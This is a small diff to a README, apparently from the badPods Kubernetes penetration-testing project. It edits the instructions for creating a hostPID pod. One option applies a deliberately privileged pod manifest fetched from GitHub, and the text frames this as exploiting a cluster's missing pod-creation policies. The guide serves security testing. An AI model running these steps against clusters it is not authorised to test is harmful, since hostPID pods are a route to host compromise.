@@ -7,9 +7,9 @@ You are exploiting the fact that there are no polices preventing the creation of
 ### Create a pod
 ```bash
 # Option 1: Create pod from local yaml 
-kubectl apply -f pod-hostpid-only.yaml  [-n namespace] 
+kubectl apply -f pod-hostpid-only.yaml   
 # Option 2: Create pod from github hosted yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml [-n namespace] 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml  
 ```
 
 ### Exec into pod 
